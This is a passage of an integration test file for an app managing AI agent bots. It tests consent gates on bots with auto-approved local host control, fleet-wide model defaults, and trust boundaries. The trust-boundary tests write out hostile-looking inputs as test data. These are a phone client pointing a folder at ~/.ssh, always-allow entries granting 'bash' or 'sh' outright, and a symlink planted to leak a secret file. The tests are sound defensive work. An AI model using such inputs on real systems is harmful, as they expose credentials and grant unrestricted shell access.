    // acknowledgeLocalAuto in between — so the gate has to look at what is
    // about to be persisted, not at the empty set the allowlist narrows it
    // to for this one call.
    expect((await api("PUT", "/api/config", { botDefaults: { allowedComputers: ["cloud"] } })).status).toBe(200);
    const auto = (await api("POST", "/api/bots", { name: "Priya Unattended" })).body.bot;
    expect((await api("PATCH", `/api/bots/${auto.id}`, { autoApprove: true })).status).toBe(200);

    // "local" is blocked by the CURRENT allowlist, so the immediately
    // applied set is empty — that must not read as "nothing to acknowledge."
    const blocked = await api("POST", "/api/bots/apply-defaults", {
      botDefaults: { computers: ["local"] },
    });
    expect(blocked.status).toBe(400);
    expect(blocked.body.needsAcknowledgement.map((entry: { id: string }) => entry.id)).toContain(auto.id);

    // And the blocked default was not persisted either — nothing for a
    // later, wider allowlist to suddenly bring to life.
    const cfgBlocked = (await api("GET", "/api/config")).body;
    expect(cfgBlocked.botDefaults?.computers ?? []).not.toContain("local");

    // With the acknowledgement, the default is allowed to persist — still
    // filtered to nothing right now, because the allowlist still says so.
    const acked = await api("POST", "/api/bots/apply-defaults", {
      botDefaults: { computers: ["local"] },
      acknowledgeLocalAuto: true,
      acknowledgedBots: blocked.body.needsAcknowledgement,
    });
    expect(acked.status).toBe(200);
    expect(acked.body.computers).toEqual([]);
    expect(acked.body.config.botDefaults.computers).toEqual(["local"]);

    // The bot itself never received "local" this whole time — the allowlist
    // still blocks it in practice.
    const stillOff = (await api("GET", "/api/bots")).body.bots.find((b: { id: string }) => b.id === auto.id);
    expect(stillOff.computers ?? []).toEqual([]);

    await api("DELETE", `/api/bots/${auto.id}`);
    // Restore a harmless, already-acknowledged-free default for the tests
    // that follow, the same way the sibling test above does.
    expect((await api("PUT", "/api/config", { botDefaults: { allowedComputers: null } })).status).toBe(200);
    const restore = await api("POST", "/api/bots/apply-defaults", {
      botDefaults: { computers: ["cloud"] },
    });
    expect(restore.status).toBe(200);
  });

  it("requires fresh consent when the displayed fleet changes before confirmation", async () => {
    expect((await api("PUT", "/api/config", { botDefaults: { allowedComputers: null, computers: ["cloud"] } })).status).toBe(200);
    const first = (await api("POST", "/api/bots", { name: "Consent First" })).body.bot;
    const second = (await api("POST", "/api/bots", { name: "Consent Second" })).body.bot;
    const defaults = { computers: ["local"] };
    try {
      await api("PATCH", `/api/bots/${first.id}`, { computers: ["cloud"], autoApprove: true });
      const initial = await api("POST", "/api/bots/apply-defaults", { botDefaults: defaults });
      expect(initial.status).toBe(400);
      await api("PATCH", `/api/bots/${second.id}`, { computers: ["cloud"], autoApprove: true });
      const stale = await api("POST", "/api/bots/apply-defaults", {
        botDefaults: defaults, acknowledgeLocalAuto: true, acknowledgedBots: initial.body.needsAcknowledgement,
      });
      expect(stale.status).toBe(409);
      expect(stale.body.needsAcknowledgement).toEqual(expect.arrayContaining([
        { id: first.id, name: "Consent First" }, { id: second.id, name: "Consent Second" },
      ]));
      const unchecked = await api("POST", "/api/bots/apply-defaults", { botDefaults: defaults, acknowledgeLocalAuto: true });
      expect(unchecked.status).toBe(409);
      const config = (await api("GET", "/api/config")).body;
      expect(config.botDefaults.computers).toEqual(["cloud"]);
      const bots = (await api("GET", "/api/bots")).body.bots;
      for (const id of [first.id, second.id]) expect(bots.find((bot: { id: string }) => bot.id === id).computers).toEqual(["cloud"]);
      const accepted = await api("POST", "/api/bots/apply-defaults", {
        botDefaults: defaults, acknowledgeLocalAuto: true, acknowledgedBots: stale.body.needsAcknowledgement,
      });
      expect(accepted.status).toBe(200);
    } finally {
      await api("DELETE", `/api/bots/${first.id}`);
      await api("DELETE", `/api/bots/${second.id}`);
      expect((await api("POST", "/api/bots/apply-defaults", { botDefaults: { computers: ["cloud"] } })).status).toBe(200);
    }
  }, 90_000);

  it("fences consent-relevant bot edits while an acknowledged config save awaits", async () => {
    expect((await api("PUT", "/api/config", {
      botDefaults: { allowedComputers: null, computers: ["cloud"] },
    })).status).toBe(200);
    const bot = (await api("POST", "/api/bots", { name: "Locked Consent Bot" })).body.bot;
    try {
      expect((await api("PATCH", `/api/bots/${bot.id}`, { autoApprove: true })).status).toBe(200);
      const prompt = await api("PUT", "/api/config", { botDefaults: { computers: ["local"] } });
      expect(prompt.status).toBe(400);

      boxTurnRequests = 0;
      boxTurnGate = new Promise<void>((resolve) => { releaseBoxTurnGate = resolve; });
      const saving = api("PUT", "/api/config", {
        botDefaults: { computers: ["local"] },
        box: { token: "box_gate" },
        acknowledgeLocalAuto: true,
        acknowledgedBots: prompt.body.needsAcknowledgement,
      });
      await expect.poll(() => boxTurnRequests, { timeout: 5_000 }).toBe(1);

      expect((await api("PATCH", `/api/bots/${bot.id}`, { name: "Renamed Mid-Save" })).status).toBe(409);
      expect((await api("PATCH", `/api/bots/${bot.id}`, { computers: ["local"] })).status).toBe(409);
      expect((await api("DELETE", `/api/bots/${bot.id}`)).status).toBe(409);

      releaseBoxTurnGate?.();
      expect((await saving).status).toBe(200);
      const preserved = (await api("GET", "/api/bots?messages=0")).body.bots.find(
        (candidate: { id: string }) => candidate.id === bot.id,
      );
      expect(preserved).toMatchObject({ name: "Locked Consent Bot", autoApprove: true });
      expect(preserved.computers).toBeUndefined();
    } finally {
      releaseBoxTurnGate?.();
      boxTurnGate = null;
      releaseBoxTurnGate = null;
      await api("PATCH", `/api/bots/${bot.id}`, { computers: ["cloud"], autoApprove: false });
      await api("DELETE", `/api/bots/${bot.id}`);
      expect((await api("PUT", "/api/config", {
        botDefaults: { allowedComputers: null, computers: ["cloud"] },
        box: { token: "" },
      })).status).toBe(200);
    }
  }, 90_000);

  it("keeps bot edits available while an unrelated config save awaits", async () => {
    const bot = (await api("POST", "/api/bots", { name: "Editable During Provider Save" })).body.bot;
    let saving: ReturnType<typeof api> | undefined;
    try {
      boxTurnRequests = 0;
      boxTurnGate = new Promise<void>((resolve) => { releaseBoxTurnGate = resolve; });
      saving = api("PUT", "/api/config", { box: { token: "box_gate" } });
      await expect.poll(() => boxTurnRequests, { timeout: 5_000 }).toBe(1);

      const renamed = await api("PATCH", `/api/bots/${bot.id}`, { name: "Renamed During Provider Save" });
      expect(renamed.status).toBe(200);

      releaseBoxTurnGate?.();
      expect((await saving).status).toBe(200);
    } finally {
      releaseBoxTurnGate?.();
      await saving?.catch(() => undefined);
      boxTurnGate = null;
      releaseBoxTurnGate = null;
      await api("DELETE", `/api/bots/${bot.id}`);
      expect((await api("PUT", "/api/config", { box: { token: "" } })).status).toBe(200);
    }
  }, 90_000);

  it("skips a bot that would gain unacknowledged auto host control, and names it", async () => {
    // The per-bot PATCH refuses "This Computer" plus auto-approve without a
    // confirmed warning.  Applying a workspace default used to go straight to
    // the store and hand that same pair to every unattended bot at once —
    // the guard existed, but only one of the two callers ran it.
    expect((await api("PUT", "/api/config", { botDefaults: { allowedComputers: null } })).status).toBe(200);
    const auto = (await api("POST", "/api/bots", { name: "Nia Unattended" })).body.bot;
    expect((await api("PATCH", `/api/bots/${auto.id}`, { autoApprove: true })).status).toBe(200);

    const apply = await api("POST", "/api/bots/apply-defaults", {
      botDefaults: { computers: ["local"] },
    });
    // All or nothing.  Applying to the other bots and "skipping" this one
    // would still persist ["local"] as the workspace default, and a bot whose
    // own computers are unset reads that default on its next turn — so the
    // skip would have granted exactly the pair it claimed to refuse.
    expect(apply.status).toBe(400);
    expect(apply.body.needsAcknowledgement.map((entry: { id: string }) => entry.id)).toContain(auto.id);

    const after = (await api("GET", "/api/bots")).body.bots.find((b: { id: string }) => b.id === auto.id);
    // Untouched: no host grant, and no half-applied state.
    expect(after.computers ?? []).toEqual([]);
    expect(after.autoApprove).toBe(true);
    // …and the default itself was not written either, so nothing can inherit it.
    const cfg = (await api("GET", "/api/config")).body;
    expect(cfg.botDefaults?.computers ?? []).not.toContain("local");

    // The guard is about one specific pair, not about unattended bots in
    // general: the same bot takes a default that does not include the host.
    const cloudOnly = await api("POST", "/api/bots/apply-defaults", {
      botDefaults: { computers: ["cloud"] },
    });
    expect(cloudOnly.status).toBe(200);
    const granted = (await api("GET", "/api/bots")).body.bots.find((b: { id: string }) => b.id === auto.id);
    expect(granted.computers).toEqual(["cloud"]);

    // And with the acknowledgement the host grant goes through, which is
    // what keeps this a confirmation rather than a permanent block.
    const acked = await api("POST", "/api/bots/apply-defaults", {
      botDefaults: { computers: ["local"] },
      acknowledgeLocalAuto: true,
      acknowledgedBots: apply.body.needsAcknowledgement,
    });
    expect(acked.status).toBe(200);
    const host = (await api("GET", "/api/bots")).body.bots.find((b: { id: string }) => b.id === auto.id);
    expect(host.computers).toEqual(["local"]);

    await api("DELETE", `/api/bots/${auto.id}`);
    // An apply is fleet-wide, so this test has to clean up after itself or it
    // hands host control to the rest of the suite.  Cloud only, deliberately:
    // every later turn in this file runs against the box stub, and a "vm" in
    // the workspace default would send each unconfigured bot looking for a
    // Local VM container that no CI runner has.  Until this branch that could
    // not bite, because the allowlist above could never be reopened — the
    // PUT that restores it answered 400 — so "vm" was being filtered out of
    // every later turn by a bug rather than by intent.
    const restore = await api("POST", "/api/bots/apply-defaults", {
      botDefaults: { computers: ["cloud"] },
    });
    expect(restore.status).toBe(200);
    expect(restore.body.computers).toEqual(["cloud"]);
    // Four fleet-wide applies, two of which revoke host control from every
    // bot and so wait on each driver's cancel.  The default 20s is not enough
    // headroom for that on a loaded machine.
  }, 90_000);
});

describe("POST /api/bots/apply-model-defaults (set all bots to default models)", () => {
  it("applies only the supplied slots, leaving the rest of the bot alone", async () => {
    const ada = (await api("POST", "/api/bots", { name: "Ada Models" })).body.bot;
    // Pin a known primary so the test can detect an over-write later.
    const set = await api("PATCH", `/api/bots/${ada.id}`, {
      modelSelection: { instanceId: "fake", model: "before" },
    });
    expect(set.status).toBe(200);

    // Only primary is supplied; fallbacks must remain absent on the bot.
    const apply = await api("POST", "/api/bots/apply-model-defaults", {
      slots: { primary: { instanceId: "fake", model: "after" } },
    });
    expect(apply.status).toBe(200);
    expect(apply.body.applied).toBeGreaterThanOrEqual(1);

    const after = (await api("GET", "/api/bots")).body.bots.find((b: { id: string }) => b.id === ada.id);
    expect(after.modelSelection.model).toBe("after");
    expect(after.modelSelection.fallbacks ?? []).toEqual([]);

    await api("DELETE", `/api/bots/${ada.id}`);
  });

  it("rejects a slot that is not an object, and one missing instanceId", async () => {
    const bad = await api("POST", "/api/bots/apply-model-defaults", { slots: { primary: "fake" } });
    expect(bad.status).toBe(400);
    const missing = await api("POST", "/api/bots/apply-model-defaults", {
      slots: { primary: { instanceId: "fake" } },
    });
    expect(missing.status).toBe(400);
  });

  it("leaves a bot that is mid-turn on its own model, and names it in the response", async () => {
    // The per-bot PATCH answers 409 here.  This route validated each slot
    // once with no bot in hand, and checkedModelSelection only raises the
    // busy gate when it is given a CURRENT selection to compare against — so
    // the gate never fired and a fleet apply swapped the engine out from
    // under a running turn.
    const instances = (await api("GET", "/api/instances")).body.instances;
    const claude = instances.find((instance: { instanceId: string }) => instance.instanceId === "claude");
    expect(claude.snapshot.state).toBe("available");
    const bot = (await api("POST", "/api/bots", { name: "Ida Busy" })).body.bot;
    try {
      expect((await api("PATCH", `/api/bots/${bot.id}`, {
        modelSelection: { instanceId: "claude", model: claude.models.default },
        // Explicitly no computer.  This test is about the model gate, and a
        // bot left on "auto" would inherit whatever workspace default an
        // earlier block persisted and spend the turn trying to mount it.
        computers: [],
      })).status).toBe(200);
      // the fixture CLI hangs, so this turn stays live until it is stopped
      expect((await api("POST", `/api/bots/${bot.id}/messages`, { text: "hang forever" })).status).toBe(202);
      await expect.poll(async () => {
        const state = (await api("GET", "/api/bots?messages=0")).body.bots.find(
          (candidate: { id: string }) => candidate.id === bot.id,
        );
        return state?.busy;
      }).toBe(true);

      const apply = await api("POST", "/api/bots/apply-model-defaults", {
        slots: { primary: { instanceId: "fake", model: "swapped" } },
      });
      // The request still succeeds — the operator asked for the fleet, and
      // one busy bot is not a reason to refuse the other bots their change.
      expect(apply.status).toBe(200);
      expect(apply.body.skipped.map((entry: { id: string }) => entry.id)).toContain(bot.id);
      expect(apply.body.skipped[0].reason).toMatch(/working/);

      const after = (await api("GET", "/api/bots?messages=0")).body.bots.find(
        (candidate: { id: string }) => candidate.id === bot.id,
      );
      expect(after.modelSelection.instanceId).toBe("claude");
      expect(after.modelSelection.model).toBe(claude.models.default);
    } finally {
      await api("POST", `/api/bots/${bot.id}/interrupt`, {});
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });
});

describe("trust boundaries: phone-originated room folders, coarse always-allow, and the packaged UI folder", () => {
  const phone = { "x-botfleet-companion": "1" };
  const apiAs = async (
    headers: Record<string, string>,
    method: string,
    path: string,
    body?: unknown,
  ): Promise<{ status: number; body: any }> => {
    const res = await fetch(`${BASE}${path}`, {
      method,
      headers: { ...headers, ...(body ? { "content-type": "application/json" } : {}) },
      body: body ? JSON.stringify(body) : undefined,
    });
    return { status: res.status, body: await res.json() };
  };

  it("confines a phone's room folder to what this computer already shares, and refuses key stores", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const room = (await api("POST", "/api/groups", { name: "From the phone", memberIds: [bot.id] })).body.group;
    const project = realpathSync(mkdtempSync(join(tmpdir(), "omb-phone-project-")));
    const nested = join(project, "src");
    mkdirSync(nested);
    const ssh = join(home, ".ssh");
    mkdirSync(ssh, { recursive: true });
    const workspaces = join(home, ".botfleet", "workspaces");
    mkdirSync(workspaces, { recursive: true });
    try {
      // nobody on the computer granted this folder yet
      const refused = await apiAs(phone, "PATCH", `/api/groups/${room.id}`, { cwd: project });
      expect(refused.status).toBe(403);
      expect(refused.body.error).toMatch(/not one this computer already shares/);
      expect(refused.body.error).toMatch(/on your computer/);

      // the desktop picker is not confined
      const granted = await api("PATCH", `/api/groups/${room.id}`, { cwd: project });
      expect(granted.status).toBe(200);
      expect(granted.body.group.cwd).toBe(project);

      // now the phone may reuse or narrow within it
      const narrowed = await apiAs(phone, "PATCH", `/api/groups/${room.id}`, { cwd: nested });
      expect(narrowed.status).toBe(200);
      expect(narrowed.body.group.cwd).toBe(nested);

      // keys and BotFleet's own state stay off-limits — loudly, not silently dropped
      const keys = await apiAs(phone, "PATCH", `/api/groups/${room.id}`, { extraCwds: [nested, ssh] });
      expect(keys.status).toBe(403);
      expect(keys.body.error).toMatch(/keys or BotFleet/);
      expect((await apiAs(phone, "PATCH", `/api/groups/${room.id}`, { cwd: join(home, ".botfleet") })).status).toBe(403);

      // the app-owned workspaces under it are a root of their own
      expect((await apiAs(phone, "PATCH", `/api/groups/${room.id}`, { cwd: workspaces })).status).toBe(200);

      // clearing is never a widening
      const cleared = await apiAs(phone, "PATCH", `/api/groups/${room.id}`, { cwd: null });
      expect(cleared.status).toBe(200);
      expect(cleared.body.group).not.toHaveProperty("cwd");
    } finally {
      await api("DELETE", `/api/groups/${room.id}`);
      await api("DELETE", `/api/bots/${bot.id}`);
      rmSync(project, { recursive: true, force: true });
    }
  });

  it("refuses to remember an always-allow that is a shell in disguise", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    try {
      const coarse = await api("PATCH", `/api/bots/${bot.id}`, { alwaysAllow: ["Bash:git", "Bash:bash"] });
      expect(coarse.status).toBe(400);
      expect(coarse.body.error).toMatch(/every shell command/);
      const direct = await api("POST", `/api/bots/${bot.id}/always-allow`, { allowKey: "Bash:sh" });
      expect(direct.status).toBe(400);
      expect(direct.body.error).toMatch(/every shell command/);
      const narrow = await api("PATCH", `/api/bots/${bot.id}`, { alwaysAllow: ["Bash:git"] });
      expect(narrow.status).toBe(200);
      expect(narrow.body.bot.alwaysAllow).toEqual(["Bash:git"]);
    } finally {
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("does not follow a symlink out of the packaged UI folder", async () => {
    const secret = join(home, "not-for-the-browser.txt");
    writeFileSync(secret, "top secret");
    const link = join(staticDir, "assets", "leak.txt");
    try {
      symlinkSync(secret, link);
    } catch {
      return; // no symlink permission on this runner
    }
    const leaked = await fetch(`${BASE}/assets/leak.txt`);
    expect(leaked.status).toBe(200);
    // the SPA fallback, never the target
    expect(await leaked.text()).toContain("Packaged BotFleet");
    const inside = await fetch(`${BASE}/assets/smoke.css`);
    expect(await inside.text()).toContain("color: white");
  });
});
